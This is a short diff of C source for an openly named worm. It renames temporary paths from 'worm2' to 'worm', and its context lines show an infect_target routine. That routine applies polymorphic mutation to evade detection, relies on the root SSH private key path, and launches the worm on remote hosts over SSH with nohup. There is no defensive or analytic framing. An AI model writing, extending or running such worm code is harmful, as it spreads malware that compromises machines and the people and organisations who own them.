@@ -20,8 +20,8 @@
 #define MAX_IP_LEN 16
 #define MAX_PATH_LEN 256
 #define CHUNK_SIZE 4000
-#define REMOTE_WORM_PATH "/tmp/worm2"
-#define REMOTE_B64_PATH "/tmp/worm2.b64"
+#define REMOTE_WORM_PATH "/tmp/worm"
+#define REMOTE_B64_PATH "/tmp/worm.b64"
 #define SSH_KEY_PATH "/root/.ssh/id_rsa"
 #define SCAN_TIMEOUT 2
 #define SSH_TIMEOUT 10
@@ -357,7 +357,7 @@ int infect_target(const char* ip, const char* argv0) {
     printf("[*] Polymorphic mutation applied: %zu -> %zu bytes\n", file_size, mutated_size);
     
     // Write mutated content to temporary file
-    const char* temp_worm = "/tmp/worm2_temp";
+    const char* temp_worm = "/tmp/worm_temp";
     FILE* temp_f = fopen(temp_worm, "wb");
     if (!temp_f) {
         printf("[-] Error creating temporary file\n");
@@ -423,7 +423,7 @@ int infect_target(const char* ip, const char* argv0) {
     // 5. Execute worm on remote
     printf("[+] Executing worm on %s...\n", ip);
     char exec_cmd[512];
-    snprintf(exec_cmd, sizeof(exec_cmd), "nohup %s > /tmp/worm2.log 2>&1 &", REMOTE_WORM_PATH);
+    snprintf(exec_cmd, sizeof(exec_cmd), "nohup %s > /tmp/worm.log 2>&1 &", REMOTE_WORM_PATH);
     run_ssh_command(ip, exec_cmd);
     
     printf("[+] Infection complete for %s\n", ip);
